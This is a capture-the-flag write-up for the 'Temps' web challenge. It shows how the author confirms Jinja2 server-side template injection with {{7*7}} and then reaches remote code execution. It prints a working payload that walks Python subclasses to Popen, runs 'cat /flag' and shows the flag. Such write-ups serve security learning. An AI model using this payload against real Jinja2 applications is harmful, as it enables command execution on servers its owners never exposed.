---
layout: post
CTF: "SummitCTF 2025"
author: Xpl01te4gl3
date: 2025-04-12
categories: ["Web"]
tags: ["SSTI","Jinja2","RCE"]

---

# Writeup #1 – Temps

## Overview
This challenge hinted at Server-Side Template Injection (SSTI) based on the page title. By trying a few basic expressions, I confirmed SSTI was in play — likely using Jinja2 — and then used that to execute system commands and read the flag.

## Step-by-Step Breakdown:

### Step 1: Access the Challenge Page
The challenge displayed this message:
  ``` 
  Welcome to the SSTI Challenge! Try to get the flag by exploiting the greeting page.
  ```

### Step 2: Test for SSTI
To check if template injection was possible, I entered:
 ```
  {{7*7}} 
```

And the output was:
   ``` 
   Hello, 49! 
   ```

Boom — SSTI confirmed. The server was evaluating the template expression. From the syntax, it was clear the backend was using Jinja2.

### Step 3: Exploit SSTI for Code Execution
Once SSTI was confirmed, I used a well-known Jinja2 RCE payload to execute system commands:
```
{{''.__class__.__mro__[1].__subclasses__()[354]('cat /flag', shell=True, stdout=-1).communicate()[0].decode()}} 
```

This payload finds the Popen class from Python's standard library to run system commands on the server.

### Step 4: Retrieve the Flag
Running the payload returned:
```
   SummitCTF{sStI_1s_r3ally_popul4r_4_some_r3s0n}
```

